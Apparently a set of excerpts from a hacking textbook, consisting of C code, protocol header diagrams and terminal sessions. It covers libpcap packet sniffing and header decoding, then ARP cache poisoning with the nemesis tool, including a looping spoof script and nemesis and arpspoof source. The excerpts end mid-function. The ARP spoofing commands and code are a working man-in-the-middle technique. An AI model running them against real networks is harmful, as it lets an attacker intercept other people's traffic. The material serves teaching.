pcap_sniff.c\n/tmp/ccYgieqx.o: In function `main':\npcap_sniff.c:(.text+0x1c8): undefined reference to `pcap_lookupdev'\npcap_sniff.c:(.text+0x233): undefined reference to `pcap_open_live'\npcap_sniff.c:(.text+0x282): undefined reference to `pcap_next'\npcap_sniff.c:(.text+0x2c2): undefined reference to `pcap_close'\ncollect2: ld returned 1 exit status\nreader@hacking:~/booksrc $ gcc -o pcap_sniff pcap_sniff.c -l pcap\nreader@hacking:~/booksrc $ ./pcap_sniff\nFatal Error in pcap_lookupdev: no suitable device found\nreader@hacking:~/booksrc $ sudo ./pcap_sniff\nSniffing on device eth0\nGot a 82 byte packet\n00 01 6c eb 1d 50 00 01 29 15 65 b6 08 00 45 10 | ..l..P..).e...E.\n00 44 1e 39 40 00 40 06 46 20 c0 a8 2a 01 c0 a8 | .D.9@.@.F ..*...\n2a f9 8b 12 1e d2 ac 14 cf c7 e5 10 6c c9 80 18 | *...........l...\n05 b4 54 1a 00 00 01 01 08 0a 26 b6 a7 76 02 3c | ..T.......&..v.<\n37 1e 74 68 69 73 20 69 73 20 61 20 74 65 73 74 | 7.this is a test\n0d 0a                                           | ..\nGot a 66 byte packet\n00 01 29 15 65 b6 00 01 6c eb 1d 50 08 00 45 00 | ..).e...l..P..E.\n00 34 3d 2c 40 00 40 06 27 4d c0 a8 2a f9 c0 a8 | .4=,@.@.'M..*...\n2a 01 1e d2 8b 12 e5 10 6c c9 ac 14 cf d7 80 10 | *.......l.......\n05 a8 2b 3f 00 00 01 01 08 0a 02 47 27 6c 26 b6 | ..+?.......G'l&.\na7 76                                           | .v\nGot a 84 byte packet\n00 01 6c eb 1d 50 00 01 29 15 65 b6 08 00 45 10 | ..l..P..).e...E.\n00 46 1e 3a 40 00 40 06 46 1d c0 a8 2a 01 c0 a8 | .F.:@.@.F...*...\n2a f9 8b 12 1e d2 ac 14 cf d7 e5 10 6c c9 80 18 | *...........l...\n05 b4 11 b3 00 00 01 01 08 0a 26 b6 a9 c8 02 47 | ..........&....G\n27 6c 41 41 41 41 41 41 41 41 41 41 41 41 41 41 | 'lAAAAAAAAAAAAAA\n41 41 0d 0a                                     | AA..\nreader@hacking:~/booksrc $\n```", "```\n#define ETH_ALEN  6   /* Octets in one ethernet addr   */\n#define ETH_HLEN  14    /* Total octets in header */\n\n/*\n *  This is an Ethernet frame header.\n */\n\nstruct ethhdr {\n  unsigned char h_dest[ETH_ALEN]; /* Destination eth addr */\n  unsigned char h_source[ETH_ALEN]; /* Source ether addr  */\n  __be16    h_proto;    /* Packet type ID field */\n} __attribute__((packed));\n```", "```\nreader@hacking:~/booksrc $\n$ grep -R \"typedef.*__be16\" /usr/include\n`/usr/include/linux/types.h:typedef __u16 __bitwise __be16;`\n\n$ grep -R \"typedef.*__u16\" /usr/include | grep short\n/usr/include/linux/i2o-dev.h:typedef unsigned short __u16;\n`/usr/include/linux/cramfs_fs.h:typedef unsigned short __u16;`\n/usr/include/asm/types.h:typedef unsigned short __u16;\n$\n```", "```\n#define ETHER_ADDR_LEN 6\n#define ETHER_HDR_LEN 14\n\nstruct ether_hdr {\n  unsigned char ether_dest_addr[ETHER_ADDR_LEN]; // Destination MAC address\n  unsigned char ether_src_addr[ETHER_ADDR_LEN];  // Source MAC address\n  unsigned short ether_type; // Type of Ethernet packet\n};\n```", "```\nstruct iphdr\n  {\n#if __BYTE_ORDER == __LITTLE_ENDIAN\n    unsigned int ihl:4;\n    unsigned int version:4;\n#elif __BYTE_ORDER == __BIG_ENDIAN\n    unsigned int version:4;\n    unsigned int ihl:4;\n#else\n# error \"Please fix <bits/endian.h>\"\n#endif\n    u_int8_t tos;\n    u_int16_t tot_len;\n    u_int16_t id;\n    u_int16_t frag_off;\n    u_int8_t ttl;\n    u_int8_t protocol;\n    u_int16_t check;\n    u_int32_t saddr;\n    u_int32_t daddr;\n    /*The options start here. */\n  };\n```", "```\n    0                   1                   2                   3\n    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |Version|  IHL  |Type of Service|          Total Length         |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |         Identification        |Flags|      Fragment Offset    |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |  Time to Live |    Protocol   |         Header Checksum       |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                       Source Address                          |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                    Destination Address                        |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                    Options                    |    Padding    |\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n                    Example Internet Datagram Header\n```", "```\nstruct ip_hdr {\n  unsigned char ip_version_and_header_length; // Version and header length\n  unsigned char ip_tos;          // Type of service\n  unsigned short ip_len;         // Total length\n  unsigned short ip_id;          // Identification number\n  unsigned short ip_frag_offset; // Fragment offset and flags\n  unsigned char ip_ttl;          // Time to live\n  unsigned char ip_type;         // Protocol type\n  unsigned short ip_checksum;    // Checksum\n  unsigned int ip_src_addr;      // Source IP address\n  unsigned int ip_dest_addr;     // Destination IP address\n};\n```", "```\ntypedef u_int32_t tcp_seq;\n/*\n * TCP header.\n * Per RFC 793, September, 1981.\n */\nstruct tcphdr\n  {\n    u_int16_t th_sport;   /* source port */\n    u_int16_t th_dport;   /* destination port */\n    tcp_seq th_seq;   /* sequence number */\n    tcp_seq th_ack;   /* acknowledgment number */\n#  if __BYTE_ORDER == __LITTLE_ENDIAN\n    u_int8_t th_x2:4;   /* (unused) */\n    u_int8_t th_off:4;    /* data offset */\n#  endif\n#  if __BYTE_ORDER == __BIG_ENDIAN\n    u_int8_t th_off:4;    /* data offset */\n    u_int8_t th_x2:4;   /* (unused) */\n#  endif\n    u_int8_t th_flags;\n#  define TH_FIN  0x01\n#  define TH_SYN  0x02\n#  define TH_RST  0x04\n#  define TH_PUSH 0x08\n#  define TH_ACK  0x10\n#  define TH_URG  0x20\n    u_int16_t th_win;   /* window */\n    u_int16_t th_sum;   /* checksum */\n    u_int16_t th_urp;   /* urgent pointer */\n};\n```", "```\n   TCP Header Format\n\n     0                   1                   2                   3\n     0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |          Source Port          |       Destination Port        |\n    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |                        Sequence Number                        |\n    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |                    Acknowledgment Number                      |\n    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |  Data |           |U|A|P|R|S|F|                               |\n    | Offset| Reserved  |R|C|S|S|Y|I|            Window             |\n    |       |           |G|K|H|T|N|N|                               |\n    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |           Checksum            |         Urgent Pointer        |\n    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |                    Options                    |    Padding    |\n    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |                             data                              |\n    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n Data Offset: 4 bits\n     The number of 32 bit words in the TCP Header.  This indicates where\n     the data begins.  The TCP header (even one including options) is an\n     integral number of 32 bits long.\n Reserved: 6 bits\n     Reserved for future use.  Must be zero.\n Options: variable\n```", "```\nstruct tcp_hdr {\n  unsigned short tcp_src_port;   // Source TCP port\n  unsigned short tcp_dest_port;  // Destination TCP port\n  unsigned int tcp_seq;          // TCP sequence number\n  unsigned int tcp_ack;          // TCP acknowledgment number\n  unsigned char reserved:4;      // 4 bits from the 6 bits of reserved space\n  unsigned char tcp_offset:4;    // TCP data offset for little-endian host\n  unsigned char tcp_flags;       // TCP flags (and 2 bits from reserved space)\n#define TCP_FIN   0x01\n#define TCP_SYN   0x02\n#define TCP_RST   0x04\n#define TCP_PUSH  0x08\n#define TCP_ACK   0x10\n#define TCP_URG   0x20\n  unsigned short tcp_window;     // TCP window size\n  unsigned short tcp_checksum;   // TCP checksum\n  unsigned short tcp_urgent;     // TCP urgent pointer\n};\n```", "```\nint pcap_loop(pcap_t *handle, int count, pcap_handler callback, u_char *args);\n```", "```\nvoid callback(u_char *args, const struct pcap_pkthdr *cap_header, const u_char *packet);\n```", "```\n#include <pcap.h>\n#include \"hacking.h\"\n#include \"hacking-network.h\"\n\nvoid pcap_fatal(const char *, const char *);\nvoid decode_ethernet(const u_char *);\nvoid decode_ip(const u_char *);\nu_int decode_tcp(const u_char *);\n\nvoid caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);\n\nint main() {\n   struct pcap_pkthdr cap_header;\n   const u_char *packet, *pkt_data;\n   char errbuf[PCAP_ERRBUF_SIZE];\n   char *device;\n   pcap_t *pcap_handle;\n\n   device = pcap_lookupdev(errbuf);\n   if(device == NULL)\n      pcap_fatal(\"pcap_lookupdev\", errbuf);\n\n   printf(\"Sniffing on device %s\\n\", device);\n\n   pcap_handle = pcap_open_live(device, 4096, 1, 0, errbuf);\n   if(pcap_handle == NULL)\n      pcap_fatal(\"pcap_open_live\", errbuf);\n\n   pcap_loop(pcap_handle, 3, caught_packet, NULL);\n\n   pcap_close(pcap_handle);\n}\n```", "```\nvoid caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char\n*packet) {\n   int tcp_header_length, total_header_size, pkt_data_len;\n   u_char *pkt_data;\n\n   printf(\"==== Got a %d byte packet ====\\n\", cap_header->len);\n\n   decode_ethernet(packet);\n   decode_ip(packet+ETHER_HDR_LEN);\n   tcp_header_length = decode_tcp(packet+ETHER_HDR_LEN+sizeof(struct ip_hdr));\n\n   total_header_size = ETHER_HDR_LEN+sizeof(struct ip_hdr)+tcp_header_length;\n   pkt_data = (u_char *)packet + total_header_size;  // pkt_data points to the data\n portion.\n   pkt_data_len = cap_header->len - total_header_size;\n   if(pkt_data_len > 0) {\n      printf(\"\\t\\t\\t%u bytes of packet data\\n\", pkt_data_len);\n      dump(pkt_data, pkt_data_len);\n   } else\n      printf(\"\\t\\t\\tNo Packet Data\\n\");\n}\n\nvoid pcap_fatal(const char *failed_in, const char *errbuf) {\n   printf(\"Fatal Error in %s: %s\\n\", failed_in, errbuf);\n   exit(1); \n}\n```", "```\nvoid decode_ethernet(const u_char *header_start) {\n   int i;\n   const struct ether_hdr *ethernet_header;\n\n   ethernet_header = (const struct ether_hdr *)header_start;\n   printf(\"[[  Layer 2 :: Ethernet Header  ]]\\n\");\n   printf(\"[ Source: %02x\", ethernet_header->ether_src_addr[0]);\n   for(i=1; i < ETHER_ADDR_LEN; i++)\n      printf(\":%02x\", ethernet_header->ether_src_addr[i]);\n\n   printf(\"\\tDest: %02x\", ethernet_header->ether_dest_addr[0]);\n   for(i=1; i < ETHER_ADDR_LEN; i++)\n      printf(\":%02x\", ethernet_header->ether_dest_addr[i]);\n   printf(\"\\tType: %hu ]\\n\", ethernet_header->ether_type);\n}\n\nvoid decode_ip(const u_char *header_start) {\n   const struct ip_hdr *ip_header;\n\n   ip_header = (const struct ip_hdr *)header_start;\n   printf(\"\\t((  Layer 3 ::: IP Header  ))\\n\");\n   printf(\"\\t( Source: %s\\t\", inet_ntoa(ip_header->ip_src_addr));\n   printf(\"Dest: %s )\\n\", inet_ntoa(ip_header->ip_dest_addr));\n   printf(\"\\t( Type: %u\\t\", (u_int) ip_header->ip_type);\n   printf(\"ID: %hu\\tLength: %hu )\\n\", ntohs(ip_header->ip_id), ntohs(ip_header->ip_len));\n}\n\nu_int decode_tcp(const u_char *header_start) {\n   u_int header_size;\n   const struct tcp_hdr *tcp_header;\n\n   tcp_header = (const struct tcp_hdr *)header_start;\n   header_size = 4 * tcp_header->tcp_offset;\n\n   printf(\"\\t\\t{{  Layer 4 :::: TCP Header  }}\\n\");\n   printf(\"\\t\\t{ Src Port: %hu\\t\", ntohs(tcp_header->tcp_src_port));\n   printf(\"Dest Port: %hu }\\n\", ntohs(tcp_header->tcp_dest_port));\n   printf(\"\\t\\t{ Seq #: %u\\t\", ntohl(tcp_header->tcp_seq));\n   printf(\"Ack #: %u }\\n\", ntohl(tcp_header->tcp_ack));\n   printf(\"\\t\\t{ Header Size: %u\\tFlags: \", header_size);\n   if(tcp_header->tcp_flags & TCP_FIN)\n      printf(\"FIN \");\n   if(tcp_header->tcp_flags & TCP_SYN)\n      printf(\"SYN \");\n   if(tcp_header->tcp_flags & TCP_RST)\n      printf(\"RST \");\n   if(tcp_header->tcp_flags & TCP_PUSH)\n      printf(\"PUSH \");\n   if(tcp_header->tcp_flags & TCP_ACK)\n      printf(\"ACK \");\n   if(tcp_header->tcp_flags & TCP_URG)\n      printf(\"URG \");\n   printf(\" }\\n\");\n\n   return header_size; \n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o decode_sniff decode_sniff.c -lpcap\nreader@hacking:~/booksrc $ sudo ./decode_sniff\nSniffing on device eth0\n==== Got a 75 byte packet ====\n[[  Layer 2 :: Ethernet Header  ]]\n[ Source: 00:01:29:15:65:b6     Dest: 00:01:6c:eb:1d:50 Type: 8 ]\n        ((  Layer 3 ::: IP Header  ))\n        ( Source: 192.168.42.1  Dest: 192.168.42.249 )\n        ( Type: 6       ID: 7755        Length: 61 )\n                {{  Layer 4 :::: TCP Header  }}\n                { Src Port: 35602       Dest Port: 7890 }\n                { Seq #: 2887045274     Ack #: 3843058889 }\n                { Header Size: 32       Flags: PUSH ACK  }\n                        9 bytes of packet data\n74 65 73 74 69 6e 67 0d 0a                      | testing..\n==== Got a 66 byte packet ====\n[[  Layer 2 :: Ethernet Header  ]]\n[ Source: 00:01:6c:eb:1d:50     Dest: 00:01:29:15:65:b6 Type: 8 ]\n        ((  Layer 3 ::: IP Header  ))\n        ( Source: 192.168.42.249        Dest: 192.168.42.1 )\n        ( Type: 6       ID: 15678       Length: 52 )\n                {{  Layer 4 :::: TCP Header  }}\n                { Src Port: 7890        Dest Port: 35602 }\n                { Seq #: 3843058889     Ack #: 2887045283 }\n                { Header Size: 32       Flags: ACK  }\n                        No Packet Data\n==== Got a 82 byte packet ====\n[[  Layer 2 :: Ethernet Header  ]]\n[ Source: 00:01:29:15:65:b6     Dest: 00:01:6c:eb:1d:50 Type: 8 ]\n        ((  Layer 3 ::: IP Header  ))\n        ( Source: 192.168.42.1  Dest: 192.168.42.249 )\n        ( Type: 6       ID: 7756        Length: 68 )\n                {{  Layer 4 :::: TCP Header  }}\n                { Src Port: 35602       Dest Port: 7890 }\n                { Seq #: 2887045283     Ack #: 3843058889 }\n                { Header Size: 32       Flags: PUSH ACK  }\n                        16 bytes of packet data\n74 68 69 73 20 69 73 20 61 20 74 65 73 74 0d 0a | this is a test..\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ping -c 1 -w 1 192.168.0.1\nPING 192.168.0.1 (192.168.0.1): 56 octets data\n64 octets from 192.168.0.1: icmp_seq=0 ttl=64 time=0.4 ms\n--- 192.168.0.1 ping statistics ---\n1 packets transmitted, 1 packets received, 0% packet loss\nround-trip min/avg/max = 0.4/0.4/0.4 ms\nreader@hacking:~/booksrc $ ping -c 1 -w 1 192.168.0.118\nPING 192.168.0.118 (192.168.0.118): 56 octets data\n64 octets from 192.168.0.118: icmp_seq=0 ttl=128 time=0.4 ms\n--- 192.168.0.118 ping statistics ---\n1 packets transmitted, 1 packets received, 0% packet loss\nround-trip min/avg/max = 0.4/0.4/0.4 ms\nreader@hacking:~/booksrc $ arp -na\n? (192.168.0.1) at 00:50:18:00:0F:01 [ether] on eth0\n? (192.168.0.118) at 00:C0:F0:79:3D:30 [ether] on eth0\nreader@hacking:~/booksrc $ ifconfig eth0\neth0      Link encap:Ethernet  HWaddr 00:00:AD:D1:C7:ED\n          inet addr:192.168.0.193  Bcast:192.168.0.255  Mask:255.255.255.0\n          UP BROADCAST NOTRAILERS RUNNING  MTU:1500  Metric:1\n          RX packets:4153 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:3875 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:100\n          RX bytes:601686 (587.5 Kb)  TX bytes:288567 (281.8 Kb)\n          Interrupt:9 Base address:0xc000 \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ nemesis\n\nNEMESIS -=- The NEMESIS Project Version 1.4 (Build 26)\n\nNEMESIS Usage:\n  nemesis [mode] [options]\n\nNEMESIS modes:\n  arp\n  dns\n  ethernet\n  icmp\n  igmp\n  ip\n  ospf (currently non-functional)\n  rip\n  tcp\n  udp\n\nNEMESIS options: \n  To display options, specify a mode with the option \"help\".\n\nreader@hacking:~/booksrc $ nemesis arp help\n\nARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)\n\nARP/RARP Usage:\n  arp [-v (verbose)] [options]\n\nARP/RARP Options: \n  -S <Source IP address>\n  -D <Destination IP address>\n  -h <Sender MAC address within ARP frame>\n  -m <Target MAC address within ARP frame>\n  -s <Solaris style ARP requests with target hardware addess set to broadcast>\n  -r ({ARP,RARP} REPLY enable)\n  -R (RARP enable)\n  -P <Payload file>\n\nData Link Options: \n  -d <Ethernet device name>\n  -H <Source MAC address>\n  -M <Destination MAC address>\n\nYou must define a Source and Destination IP address.\n\nreader@hacking:~/booksrc $ sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D\n192.168.0.118 -h 00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -\nM 00:C0:F0:79:3D:30\n\nARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)\n\n               [MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30\n     [Ethernet type] ARP (0x0806)\n\n  [Protocol addr:IP] 192.168.0.1 > 192.168.0.118\n [Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30\n        [ARP opcode] Reply\n  [ARP hardware fmt] Ethernet (1)\n  [ARP proto format] IP (0x0800)\n  [ARP protocol len] 6\n  [ARP hardware len] 4\n\nWrote 42 byte unicast ARP request packet through linktype DLT_EN10MB\n\nARP Packet Injected\nreader@hacking:~/booksrc $ sudo nemesis arp -v -r -d eth0 -S 192.168.0.118 -D \n192.168.0.1 -h  00:00:AD:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M \n00:50:18:00:0F:01\n\nARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)\n\n               [MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01\n     [Ethernet type] ARP (0x0806)\n\n  [Protocol addr:IP] 192.168.0.118 > 192.168.0.1\n [Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01\n        [ARP opcode] Reply\n  [ARP hardware fmt] Ethernet (1)\n  [ARP proto format] IP (0x0800)\n  [ARP protocol len] 6\n  [ARP hardware len] 4\n\nWrote 42 byte unicast ARP request packet through linktype DLT_EN10MB.\n\nARP Packet Injected \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ while true\n> do\n> sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D 192.168.0.118 -h\n00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -M \n00:C0:F0:79:3D:30\n> sudo nemesis arp -v -r -d eth0 -S 192.168.0.118 -D 192.168.0.1 -h \n00:00:AD:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M \n00:50:18:00:0F:01\n> echo \"Redirecting...\"\n> sleep 10\n> done\n\nARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)\n\n               [MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30\n     [Ethernet type] ARP (0x0806)\n\n  [Protocol addr:IP] 192.168.0.1 > 192.168.0.118\n [Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30\n        [ARP opcode] Reply\n  [ARP hardware fmt] Ethernet (1)\n  [ARP proto format] IP (0x0800)\n  [ARP protocol len] 6\n  [ARP hardware len] 4\nWrote 42 byte unicast ARP request packet through linktype DLT_EN10MB.\n\nARP Packet Injected\n\nARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)\n\n               [MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01\n     [Ethernet type] ARP (0x0806)\n\n  [Protocol addr:IP] 192.168.0.118 > 192.168.0.1\n [Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01\n        [ARP opcode] Reply\n  [ARP hardware fmt] Ethernet (1)\n  [ARP proto format] IP (0x0800)\n  [ARP protocol len] 6\n  [ARP hardware len] 4\nWrote 42 byte unicast ARP request packet through linktype DLT_EN10MB.\nARP Packet Injected \nRedirecting...\n```", "```\nstatic ETHERhdr etherhdr;\n`static ARPhdr arphdr;`\n\n...\n\nvoid nemesis_arp(int argc, char **argv)\n{\n    const char *module= \"ARP/RARP Packet Injection\";\n\n    nemesis_maketitle(title, module, version);\n\n    if (argc > 1 && !strncmp(argv[1], \"help\", 4))\n        arp_usage(argv[0]);\n\n    `arp_initdata();     arp_cmdline(argc, argv);     arp_validatedata();     arp_verbose();`\n\n    if (got_payload)\n    {\n        if (builddatafromfile(ARPBUFFSIZE, &pd, (const char *)file,\n                    (const u_int32_t)PAYLOADMODE) < 0)\n            arp_exit(1);\n    }\n\n    `if (buildarp(&etherhdr, &arphdr, &pd, device, reply) < 0)     {         printf(\"\\n%s Injection Failure\\n\", (rarp == 0 ? \"ARP\" : \"RARP\"));         arp_exit(1);     }     else     {         printf(\"\\n%s Packet Injected\\n\", (rarp == 0 ? \"ARP\" : \"RARP\"));         arp_exit(0);     }` \n}\n```", "```\ntypedef struct libnet_arp_hdr ARPhdr;\ntypedef struct libnet_as_lsa_hdr ASLSAhdr;\ntypedef struct libnet_auth_hdr AUTHhdr;\ntypedef struct libnet_dbd_hdr DBDhdr;\ntypedef struct libnet_dns_hdr DNShdr;\n`typedef struct libnet_ethernet_hdr ETHERhdr;`\ntypedef struct libnet_icmp_hdr ICMPhdr;\ntypedef struct libnet_igmp_hdr IGMPhdr; \ntypedef struct libnet_ip_hdr IPhdr;\n```", "```\nstatic void arp_initdata(void)\n{\n    /* defaults */\n    etherhdr.ether_type = ETHERTYPE_ARP;  /* Ethernet type ARP */\n    memset(etherhdr.ether_shost, 0, 6);   /* Ethernet source address */\n    memset(etherhdr.ether_dhost, 0xff, 6); /* Ethernet destination address */\n    arphdr.ar_op = ARPOP_REQUEST;         /* ARP opcode: request */\n    arphdr.ar_hrd = ARPHRD_ETHER;         /* hardware format: Ethernet */\n    arphdr.ar_pro = ETHERTYPE_IP;         /* protocol format: IP */\n    arphdr.ar_hln = 6;                    /* 6 byte hardware addresses */\n    arphdr.ar_pln = 4;                    /* 4 byte protocol addresses */\n    memset(arphdr.ar_sha, 0, 6);          /* ARP frame sender address */\n    memset(arphdr.ar_spa, 0, 4);           /* ARP sender protocol (IP) addr */\n    memset(arphdr.ar_tha, 0, 6);          /* ARP frame target address */\n    memset(arphdr.ar_tpa, 0, 4);          /* ARP target protocol (IP) addr */\n    pd.file_mem = NULL;\n    pd.file_s = 0;\n    return;\n}\n```", "```\nint buildarp(ETHERhdr *eth, ARPhdr *arp, FileData *pd, char *device,\n        int reply)\n{\n    int n = 0;\n    u_int32_t arp_packetlen;\n    static u_int8_t *pkt;\n    struct libnet_link_int *l2 = NULL;\n\n    /* validation tests */\n\n    if (pd->file_mem == NULL)\n        pd->file_s = 0;\n\n    arp_packetlen = LIBNET_ARP_H + LIBNET_ETH_H + pd->file_s;\n\n#ifdef DEBUG\n    printf(\"DEBUG: ARP packet length %u.\\n\", arp_packetlen);\n    printf(\"DEBUG: ARP payload size  %u.\\n\", pd->file_s);\n#endif\n\n    if ((l2 = `libnet_open_link_interface(device, errbuf)` ) == NULL)\n    {\n        nemesis_device_failure(INJECTION_LINK, (const char *)device);\n        return -1;\n    }\n\n    if `(libnet_init_packet(arp_packetlen, &pkt)`  == -1)\n    {\n        fprintf(stderr, \"ERROR: Unable to allocate packet memory.\\n\");\n        return -1;\n    }\n\n    `libnet_build_ethernet(eth->ether_dhost, eth->ether_shost, eth->ether_type,             NULL, 0, pkt);      libnet_build_arp(arp->ar_hrd, arp->ar_pro, arp->ar_hln, arp->ar_pln,             arp->ar_op, arp->ar_sha, arp->ar_spa, arp->ar_tha, arp->ar_tpa,             pd->file_mem, pd->file_s, pkt + LIBNET_ETH_H);      n = libnet_write_link_layer(l2, device, pkt, LIBNET_ETH_H +                 LIBNET_ARP_H + pd->file_s);`\n\n    if (verbose == 2)\n        nemesis_hexdump(pkt, arp_packetlen, HEX_ASCII_DECODE);\n    if (verbose == 3)\n        nemesis_hexdump(pkt, arp_packetlen, HEX_RAW_DECODE);\n\n    if (n != arp_packetlen)\n    {\n        fprintf(stderr, \"ERROR: Incomplete packet injection.  Only \"\n                \"wrote %d bytes.\\n\", n);\n    }\n    else\n    {\n        if (verbose)\n        {\n            if (memcmp(eth->ether_dhost, (void *)&one, 6))\n            {\n                printf(\"Wrote %d byte unicast ARP request packet through \"\n                        \"linktype %s.\\n\", n,\n                        nemesis_lookup_linktype(l2->linktype));\n            }\n            else\n            {\n                printf(\"Wrote %d byte %s packet through linktype %s.\\n\", n,\n\n                        (eth->ether_type == ETHERTYPE_ARP ? \"ARP\" : \"RARP\"),\n                        nemesis_lookup_linktype(l2->linktype));\n            }\n        }\n    }\n\n    `libnet_destroy_packet(&pkt);`\n    if (l2 != NULL)\n        `libnet_close_link_interface(l2);`\n    return (n);\n}\n```", "```\n`libnet_open_link_interface()` opens a low-level packet interface. This is \nrequired to write link layer frames. Supplied is a u_char pointer to the\ninterface device name and a u_char pointer to an error buffer. Returned is a\nfilled in libnet_link_int struct or NULL on error.\n\n`libnet_init_packet()` initializes a packet for use. If the size parameter is\nomitted (or negative) the library will pick a reasonable value for the user\n(currently LIBNET_MAX_PACKET). If the memory allocation is successful, the\nmemory is zeroed and the function returns 1\\. If there is an error, the\nfunction returns -1\\. Since this function calls malloc, you certainly should,\nat some point, make a corresponding call to destroy_packet().\n\n`libnet_build_ethernet()` constructs an ethernet packet. Supplied is the\ndestination  address, source address (as arrays of unsigned characterbytes)\nand the ethernet frame type, a pointer to an optional data  payload, the\npayload  length, and a pointer to a pre-allocated block of memory for the\npacket. The ethernet packet type should be one  of the following:\n\nValue               Type\nETHERTYPE_PUP       PUP protocol\nETHERTYPE_IP        IP protocol\nETHERTYPE_ARP       ARP protocol\nETHERTYPE_REVARP    Reverse ARP protocol\nETHERTYPE_VLAN      IEEE VLAN tagging\nETHERTYPE_LOOPBACK  Used to test interfaces\n\n`libnet_build_arp()` constructs an ARP (Address Resolution Protocol) packet.\nSupplied are the following: hardware address type, protocol address type, the\nhardware address length, the protocol address length, the ARP packet type, the\nsender hardware address, the sender protocol address, the target hardware\naddress, the target protocol address, the packet payload, the payload size,\nand finally, a pointer to the packet header memory. Note that this function\n\nonly builds ethernet/IP ARP packets, and consequently the first value should\nbe ARPHRD_ETHER. The ARP packet type should be one of the following:\nARPOP_REQUEST, ARPOP_REPLY, ARPOP_REVREQUEST, ARPOP_REVREPLY,\nARPOP_INVREQUEST, or ARPOP_INVREPLY.\n\n`libnet_destroy_packet()` frees the memory associated with the packet.\n\n`libnet_close_link_interface()` closes an opened low-level packet interface.\nReturned is 1 upon success or -1 on error.\n```", "```\nNAME\n       arpspoof - intercept packets on a switched LAN\n\nSYNOPSIS\n       arpspoof [-i interface] [-t target] host\n\nDESCRIPTION\n       arpspoof redirects packets from a target host (or all hosts) on the LAN\n       intended for another host on the LAN by forging ARP replies. This is\n       an extremely effective way of sniffing traffic on a switch.\n\n       Kernel IP forwarding (or a userland program which accomplishes the\n       same, e.g. fragrouter(8)) must be turned on ahead of time.\n\nOPTIONS\n       -i interface\n              Specify the interface to use.\n\n       -t target\n              Specify a particular host to ARP poison (if not  specified, all\n              hosts on the LAN).\n\n       host   Specify  the host you wish to intercept packets for (usually the\n              local gateway).\n\nSEE ALSO\n       dsniff(8), fragrouter(8)\n\nAUTHOR \n       Dug Song <dugsong@monkey.org>\n```", "```\nstatic struct libnet_link_int *llif;\nstatic struct ether_addr spoof_mac, target_mac;\nstatic in_addr_t spoof_ip, target_ip;\n\n...\n\nint\narp_send(struct libnet_link_int *llif, char *dev,\n     int op, u_char *sha, in_addr_t spa, u_char *tha, in_addr_t 